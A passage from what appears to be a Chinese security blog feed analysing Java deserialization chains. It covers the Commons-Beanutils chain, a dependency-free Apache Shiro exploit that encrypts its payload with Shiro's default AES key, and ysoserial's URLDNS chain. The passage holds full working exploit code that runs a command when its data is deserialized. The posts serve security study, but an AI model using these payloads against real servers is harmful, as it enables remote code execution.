class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">demo</span> <span class="variable">zbz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo</span>(<span class="string">&quot;zbz&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(zbz, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(zbz.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到输出是一样的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778237899-aedf4ac8-9dba-40f8-99bf-35d10377785a.png" alt=""></p><p>这里引用其他师傅的介绍</p><p>在 CB 中有个工具类叫PropertyUtils，它可以对 javaBean 进行一些操作</p><p>PropertyUtils类下提供了一些静态方法，以方便开发者直接调用一些getter和setter方法：</p><p>getProperty：返回指定Bean的指定属性的值</p><p>getSimpleProperty：返回指定Bean的指定属性的值</p><p>setProperty：设置指定Bean的指定属性的值</p><p>setSimpleProperty：设置指定Bean的指定属性的值</p><p>这里cb链的问题主要是出现在这个方法中我们跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778405999-f5637048-8910-46b4-9595-6320ca294495.png" alt=""></p><p>继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778420187-4d5775bd-853b-4c73-ad7c-65bd16f9240a.png" alt=""></p><p>继续接着跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778610024-c8ff7088-7fa6-4b4c-bad7-147b30deadfa.png" alt=""></p><p>进到getNestedProperty类，继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778660361-a4b7a70d-8a49-4034-8429-5480a69aea8c.png" alt=""></p><p>跟进这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778791831-91234bad-359f-43e4-a946-68a0f5bc8a55.png" alt=""></p><p>跟到这里继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779111312-f6d7d943-d388-4261-a92e-b674457bfbb7.png" alt=""></p><p>可以看到，我们传入的是 name ，这里返回 Bean 属性值是 Name ，并且 set 方法与 get 方法都是 setName , getName ，这是 JavaBean 的命名格式，会将传进来的小写首字母大写关于javaBean的一些知识[什么是JavaBean？ - JYRoy - 博客园 (<a href="http://cnblogs.com">cnblogs.com</a>)](<a href="https://www.cnblogs.com/jyroy/p/11102298.html#:~:text">https://www.cnblogs.com/jyroy/p/11102298.html#:~:text</a>= JavaBeans是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。,特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。 名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779227248-f2debeaf-2a44-479d-93ca-6a2872c272c9.png" alt=""></p><p>到这里可以看到这部分很像反射调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779277688-c2db2e00-3ead-4e35-bb1a-231557e821e3.png" alt=""></p><p>可以看到就是利用了反射调用对象中的方法。这里我们直接总结一下也就是说我们可以通过PropertyUtils.getProperty(zbz, “name”); 的方式进行递归获取。通过这个<br>方法，使用者可以很方便地调用任意对象的getter。</p><p>然后后面就是与Templates链的结合使用，具体可以参考cc3 cc4看看templates的原理调用这里就不过多介绍</p><p>主要介绍为什么会结合这个templates这个类。这里直接给出结论就是<code>**getOutputProperties()**</code>方法即其 _outputProperties 属性的 getter 方法是加载恶意字节码的起点，我们可以利用 前面提到的，commons-beanutils里的<code>**PropertyUtils.getProperty()**</code>去调用getter。那么往上找链子，CB链里 哪个位置调用了<code>**getProperty**</code>呢？</p><p>在之前的CC2/4的链中我们用到了<code>**java.util.PriorityQueue**</code>的readObject触发反序列化，主要是通过调用了其<code>**TransformingComparator**</code>的compare方法，进而调用了transform链的调用</p><p>而 CommonsBeanutils 利用链中核心的触发位置就是 <code>**BeanComparator.compare()**</code> 函数，当调用 <code>**BeanComparator.compare()**</code> 函数时，其内部会调用我们前面说的 <code>**getProperty**</code> 函数，进而调用 JavaBean 中对应属性的 getter 函数。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779913758-45432ec3-2439-4577-b2b0-7fdf7f5e9631.png" alt=""></p><p>这里会调用<code>**PropertyUtils.getProperty()**</code>方法 因此通过给 o1赋值构造好的templates对象，property赋值为TemplatesImpl的 outputProperties属性，即可调用 <code>**TemplatesImpl.getOutputProperties()**</code> 往下就是TemplatesImpl的利用链。那么往上找 哪里调用 compare()呢 可以利用CC2/4链中用的 <code>**PriorityQueue.readObject()**</code><strong>具体可以参考自己写的cc2讲解了如何调用的compare方法以及comparator也可以控制。</strong></p><p>前面的<a href="https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/">CC2链</a>文章提到了，queue的size应该大于等于2，而add()也会执行compare，由于在BeanComparator的compare()方法中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。所以在初始化的时候，我们add任意值，然后利用反射修改成恶意TemplateImpl 对象</p><p>给出exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">payload</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;CB1&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="无依赖打shiro">无依赖打shiro</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724782115685-9fa08452-14c4-4e98-8755-8fc19bf43b66.png" alt=""></p><p>在<code>BeanComparator</code>类的构造函数处，当没有显式传入<code>Comparator</code>的情况下，则默认使用 <code>ComparableComparator</code> 。</p><p>既然此时没有ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li>实现 java.util.Comparator接口</li><li>实现java.io.Serializable接口</li><li>Java、shiro或commons-beanutils自带</li></ul><p><code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了 <code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码</p><p>通过<code>String.CASE_INSENSITIVE_ORDER</code> 即可拿到上下文中的<code>CaseInsensitiveComparator</code>对象，用它来实例化 <code>BeanComparator</code></p><p>所以exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">//        Object o = (Object)ois.readObject();</span></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/gk0d/p/16889963.html">https://www.cnblogs.com/gk0d/p/16889963.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;java-cb链&quot;&gt;java cb链&lt;/h2&gt;
&lt;h3 id=&quot;环境搭建&quot;&gt;环境搭建&lt;/h3&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="cb链" scheme="https://oceanzbz.github.io/tags/cb%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections反序列化汇总</title>
    <link href="https://oceanzbz.github.io/post/ba01d9de.html"/>
    <id>https://oceanzbz.github.io/post/ba01d9de.html</id>
    <published>2024-12-30T06:24:40.000Z</published>
    <updated>2025-03-05T07:24:36.790Z</updated>
    
    <content type="html"><![CDATA[<p>可以看一下这两篇分析java序列化和反序列化的执行流程。</p><p><a href="https://www.cnpanda.net/sec/893.html">https://www.cnpanda.net/sec/893.html</a></p><p><a href="https://www.cnpanda.net/sec/928.html">https://www.cnpanda.net/sec/928.html</a></p><p>搭建从新复习以前学过的java反序列化，尽量能够都跟一遍以前不够细致太过于浮躁，因此重新开启一个新的学习。</p><h2 id="1-环境搭建">1.环境搭建</h2><p>在进行反序列化调试时我们先<a href="https://github.com/frohoff/ysoserial">ysoserial</a>项目进行环境搭建，下面就搭建遇到的问题做一个记录。</p><p>首先直接下载压缩包然后将项目拖进idea，之后将pom.xm文件中的依赖jar全部下载。</p><h3 id="第一个问题">第一个问题</h3><p>就是依赖包有的加载不出来可能是因为我们配置的阿里云的镜像没有依赖的原因所以我们就手动将jar导入到本地maven仓库。这里参考<a href="https://blog.csdn.net/Ming_super/article/details/128728472">https://blog.csdn.net/Ming_super/article/details/128728472</a>进行导入</p><p>首先找到maven的官网然后找到自己所需要的依赖</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846520144-c8a0632e-a6d5-4cdd-9bc9-1751ec77ce83.png" alt=""></p><p>将红箭头所指的jar包下载下来。然后打开windows cmd  将jar包导入到本地仓库。</p><p>输入以下命令例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file</span><br><span class="line">        -Dfile=D:\mybatis-<span class="number">3.5</span><span class="number">.10</span>.jar</span><br><span class="line">        -DgroupId=org.mybatis</span><br><span class="line">        -DartifactId=mybatis </span><br><span class="line">        -Dversion=<span class="number">3.5</span><span class="number">.10</span> </span><br><span class="line">        -Dpackaging=jar</span><br></pre></td></tr></table></figure><p>之后就可以在pom.xml文件中正常加载了。</p><h3 id="第二个问题">第二个问题</h3><p>就是我们在运行ysoserial主程序一直报错找不到java程序包，但是通过排查发现明明已经导入进来了。</p><p>这里解决办法：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846707666-96b1ee34-0ec7-481f-b70a-d432a380655c.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846755542-a2acd9be-7a79-4fb2-97a2-71d75842c4b6.png" alt=""></p><p>打开idea项目中的Project Structure 将箭头所指的地方改成相对应的然后在setting中将本地的java环境与项目环境也设置城同样的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846810061-f2252040-e8c1-42ab-ad29-a2c1b44e0157.png" alt=""></p><p>之后就可以运行程序了。</p><p>在运行程序输入参数可以直接在项目中进行编辑</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846852331-f630cc9f-ddb0-404f-af84-0bbcc0adef30.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713846884585-98d25eba-5449-40d9-8558-3836b9e20673.png" alt=""></p><p>这里以生成urldns链为例其它的可以自行百度。</p><h2 id="java反序列化的过程">java反序列化的过程</h2><p>参考：<a href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724413722961-dd6cbb05-5809-4b6a-9ae9-22f63f62cc7f.png" alt=""></p><h2 id="调用图：">调用图：</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724417545879-786e96dc-7106-451a-a127-11550f04b107.png" alt=""></p><h2 id="2-URLDNS链">2.URLDNS链</h2><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不</p><p>是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤：</p><p>使⽤Java内置的类构造，对第三⽅库没有依赖</p><p>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</p><p>ysoserial如何生成urldns链的过程可以参考：</p><p><a href="https://www.cnblogs.com/gk0d/p/16874157.html">https://www.cnblogs.com/gk0d/p/16874157.html</a></p><h3 id="调用过程：">调用过程：</h3><p>首先判段是否传入了两个参数，如果不是则打印帮助信息；是的话会依次分别赋值给payloadType和command变量。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224687545-3edda390-9a0c-45d9-8a0c-4c684dbbd91c.png" alt=""></p><p>之后实例化了一个需要继承ObjectPayload类的类实例化对象，跟进一下getPayloadClass方法，在ysoserial.payloads.ObjectPayload.Utils下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224728921-ed2aa8ef-b5cc-4370-8fbb-6a7e6f62a6a6.png" alt=""></p><p>在箭头所指的地方通过反射获取了 URLDNS的class对象，然后实例化获取URLDNS对象并调用 getobject方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224856548-2df67463-1926-4d9f-a13b-df89d995aa2e.png" alt=""></p><p>通过跟进getobject方法发现其返回了一个hashmap对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224908824-b3a13ef8-9953-4045-93f6-7e809ff94bd5.png" alt=""></p><p>然后序列化输出该对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714224970963-b7bcbbb8-34e1-41c2-a6f3-ea5fb0ba0b0f.png" alt=""></p><p>以上就是ysoserial生成urldns的过程，下面着重分析以下为什么反序列化可以触发一次dns请求。上文已经说到了最后序列化的是hashmap对象所以我们可以直接看hashmap的readobject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\shentougongju\\ysoserial\\test.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> o.readObject();</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在hashmap的readobject中下一个断点进行调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226809705-1373e80c-42da-43cb-96bf-f6e194c1f1b9.png" alt=""></p><p>我们可以发现最终调用了一个putval方法，它里面对key进行了hash方法，而我们知道这个key是我们序列化进去的URL对象继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714226956902-caa74e7f-b275-4ed1-9462-7a9fe21ae4a6.png" alt=""></p><p>发现对key做了一个判断，如果不为空的话就调用key对象的hashcode方法，而这里我们知道key是url对象，所以调用的是URL对象的hashcode方法继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227099512-fcb456ae-9394-47eb-af59-b2fc6a283f27.png" alt=""></p><p>这里判断hashcode是否等于-1如果不等于-1就返回hashcode如果等于-1就继续调用handler的hashcode方法，这里通过上文的getobject方法可以知道传入的handler是URLStreamHandler对象继续跟进去：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227369926-1b0616ed-65b5-447d-8f1e-85f1b6a3fce8.png" alt=""></p><p>可以看到第10行调用了getHostAddress方法跟进去看看：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227492916-5798e9bc-3026-41fd-82ce-2d24029e79c8.png" alt=""></p><p>继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714227509620-598dd861-441a-4615-90fc-d14bf1509353.png" alt=""></p><p>发现调用getByname方法 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。</p><p>这里是ysoserial的payload总结一下调用链</p><ol><li>HashMap-&gt;readObject()</li><li>PutVal-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>下面我们来看一下网上常见的payload与ysoserial的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 